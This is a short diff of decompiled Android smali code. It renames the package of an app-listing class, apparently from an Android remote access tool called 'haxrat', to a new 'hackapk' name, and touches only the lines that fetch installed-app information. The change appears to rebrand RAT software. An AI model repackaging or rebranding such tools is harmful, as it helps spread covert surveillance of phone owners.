@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/AppList;
+.class public Lcom/justhack/hackapk/AppList;
 .super Ljava/lang/Object;
 .source "AppList.java"
 
@@ -38,7 +38,7 @@
     move-object v2, v12
 
     .line 20
-    sget-object v12, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v12, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v12}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
 
@@ -154,7 +154,7 @@
 
     iget-object v12, v12, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;
 
-    sget-object v13, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v13, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v13}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
 
